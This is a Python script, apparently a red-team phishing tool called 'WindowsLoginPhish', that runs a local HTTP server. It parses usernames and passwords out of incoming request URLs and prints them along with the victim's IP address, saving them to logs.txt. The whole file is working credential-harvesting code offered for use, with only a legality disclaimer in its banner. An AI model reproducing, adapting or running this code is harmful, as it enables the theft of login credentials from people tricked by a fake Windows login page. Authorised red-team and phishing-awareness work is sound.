from http.server import SimpleHTTPRequestHandler
import socketserver
import time
import sys
import socket

#fix closing part

#use args for port number
PORT=4444
OFFSET=6

#pre
try:
    PORT=int(sys.argv[1])
except IndexError:
    pass
    

#handler(middleware)
class HttpHandler(SimpleHTTPRequestHandler):
    def log_message(self,format,*args):
        file=open('logs.txt','w',1)
        ipaddr=self.client_address
        query=self.path
        if 'password' in query:
            username=query[query.find('?')+1:query.find('&')][9:]
            password=query[query.find('&')+10:]
            cache="""
[SUCCESS]
IP Address(client): {}
Username: {}
Password: {}
""".format(ipaddr,username,password)
            print(('-'*50)+cache+('-'*50))
            file.write(('-'*50)+cache+('-'*50)+'\n')
            print('[SAVED]Logs are saved in logs.txt file in current directory.')

#main
print('\n### WindowsLoginPhish by CipherKill ###\n')
print('[!!!]Intended for Red Teaming. YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS.\n[!!!]Phishing without permission is illegal.\n')
time.sleep(OFFSET/6)
print("Starting program...")
print('[NOTE]Press [Ctrl+C] to stop\n')
time.sleep(OFFSET/6)

#clear screen here

try:
    with socketserver.TCPServer(('',PORT),HttpHandler) as httpd:
        print('[READY]Set up: http://{}:{}/'.format(socket.gethostbyname(socket.gethostname()),PORT))
        print('[READY]Listening on PORT {}....'.format(PORT))
        httpd.serve_forever()
except KeyboardInterrupt:
    pass
print('\n[CLOSING]Winding up TCP connections...')
time.sleep(OFFSET/12)
httpd.server_close()
print('[CLOSED]Winding complete!\n')
time.sleep(OFFSET/60)
input('press [ENTER] to close...\n')
exit()
